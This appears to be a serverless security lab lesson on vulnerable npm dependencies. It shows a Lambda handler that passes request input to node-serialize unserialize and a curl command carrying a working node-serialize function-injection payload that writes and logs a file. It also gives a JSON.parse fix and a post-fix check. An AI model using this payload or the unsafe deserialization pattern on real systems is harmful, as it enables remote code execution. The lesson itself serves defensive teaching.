# Lesson 09 - Vulnerable Dependencies

> Lesson 09 reuses Lesson 01 exploitation evidence. The difference is the focus: Lesson 01 is event injection impact; Lesson 09 is vulnerable dependency root cause.

## Dependency evidence from the lesson page

```text
Package: node-jose
Risk: Invalid Curve Attack

Package: minimatch
Risk: Regular Expression Denial of Service
Path: node-jose > browserify > glob > minimatch

Package: shell-quote
Risk: Potential Command Injection
Path: node-jose > browserify > shell-quote

Package: node-serialize
Risk: Code Execution through IIFE
Patched in: No patch available
```

## Vulnerable code pattern

```javascript
const serialize = require('node-serialize');
const jose = require('node-jose');

exports.handler = (event, context, callback) => {
  var req = serialize.unserialize(event.body);
  var headers = serialize.unserialize(event.headers);
  // normal logic continues...
};
```

## Practical impact command

Use the Lesson 01 controlled payload:

```bash
curl -s "$API" \
  -H "content-type: application/json" \
  --data '{"action":"_$$ND_FUNC$$_function(){var fs=require(\"fs\");fs.writeFileSync(\"/tmp/hacked.txt\",\"HACKED\");var data=fs.readFileSync(\"/tmp/hacked.txt\",\"utf8\");console.error(\"YOU GOT: \"+data);}()","cart-id":"lab-cart"}'
```

Expected pre-fix evidence:

```text
CloudWatch logs show: YOU GOT: HACKED
```

## Dependency remediation pattern

```javascript
// Remove node-serialize from request parsing.
let req = {};
let headers = event.headers || {};

try {
  req = JSON.parse(event.body || "{}");
} catch (e) {
  return callback(null, {
    statusCode: 400,
    headers: { "Access-Control-Allow-Origin": "*" },
    body: JSON.stringify({ "status": "err", "msg": "invalid json" })
  });
}
```

## Post-fix verification

Repeat the same payload. Expected result:

```text
The injected CloudWatch message no longer appears.
The payload is treated as data or rejected safely.
```
